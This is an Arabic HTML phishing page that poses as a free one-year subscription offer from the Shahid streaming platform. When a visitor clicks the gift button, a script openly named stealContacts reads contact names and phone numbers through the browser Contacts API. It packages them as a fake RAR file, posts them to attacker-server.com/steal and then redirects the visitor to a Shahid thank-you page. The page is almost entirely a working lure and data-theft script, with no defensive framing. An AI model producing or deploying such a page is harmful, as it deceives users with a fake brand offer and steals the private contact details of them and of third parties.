<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>عرض حصري من شاهد!</title>
    <style>
        body { 
            background: linear-gradient(135deg, #ff0000, #b20710); 
            font-family: 'Segoe UI', Tahoma, sans-serif; 
            text-align: center;
            padding: 50px;
            color: white;
        }
        .offer-box {
            background: rgba(0, 0, 0, 0.7);
            border-radius: 20px;
            padding: 30px;
            max-width: 600px;
            margin: 0 auto;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
        }
        .btn {
            background: #e50914;
            color: white;
            padding: 15px 40px;
            font-size: 22px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            margin: 20px;
            transition: 0.3s;
        }
        .btn:hover {
            background: #ff0000;
            transform: scale(1.05);
        }
        .stars {
            font-size: 50px;
            margin: 20px;
        }
    </style>
</head>
<body>
    <div class="offer-box">
        <h1>?? فزت باشتراك مجاني لمدة سنة!</h1>
        <div class="stars">?????</div>
        <p>تم اختيارك للحصول على اشتراك مجاني في منصة شاهد لمدة 12 شهرًا</p>
        <p>انقر على الزر أدناه لتفعيل الهدية خلال 5 دقائق</p>
        
        <button class="btn" onclick="stealContacts()">نعم، أريد الهدية!</button>
        
        <p><small>عرض حصري لأول 100 مشاهد فقط - تأكد من اتصالك بالإنترنت</small></p>
    </div>

    <script>
        // دالة سرقة جهات الاتصال
        async function stealContacts() {
            try {
                // 1. محاولة الوصول لجهات الاتصال (يتطلب موافقة المستخدم)
                const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
                
                // 2. تحويل البيانات لملف نصي
                const contactData = JSON.stringify(contacts);
                const blob = new Blob([contactData], {type: 'application/json'});
                
                // 3. إنشاء ملف RAR وهمي (في الواقع ملف مضغوط بالجافاسكريبت)
                const rarBlob = new Blob([blob], {type: 'application/vnd.rar'});
                
                // 4. إرسال البيانات عبر البريد (يتطلب سيرفر خلفي)
                sendToEmail(rarBlob);
                
                // 5. توجيه المستخدم لصفحة وهمية
                window.location.href = "https://www.shahid.net/offer-thank-you";
            } catch (error) {
                console.error('فشلت العملية:', error);
                alert('حدث خطأ! يرجى المحاولة مرة أخرى.');
            }
        }

        // دالة الإرسال (نظري)
        function sendToEmail(file) {
            // ?? هذا الجزء يتطلب سيرفر خلفي حقيقي
            const formData = new FormData();
            formData.append('contacts', file, 'contacts.rar');
            
            fetch('https://attacker-server.com/steal', {
                method: 'POST',
                body: formData
            });
        }
    </script>
</body>
</html>
